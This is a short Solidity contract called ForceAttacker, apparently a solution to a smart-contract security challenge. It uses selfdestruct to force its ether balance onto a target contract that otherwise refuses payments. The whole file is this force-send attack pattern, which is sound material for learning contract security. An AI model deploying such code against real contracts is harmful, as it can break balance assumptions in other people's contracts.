// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    address target;

    constructor(address _target) payable {
        target = _target;
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    function kill() public {
        selfdestruct(payable(target));
    }
}
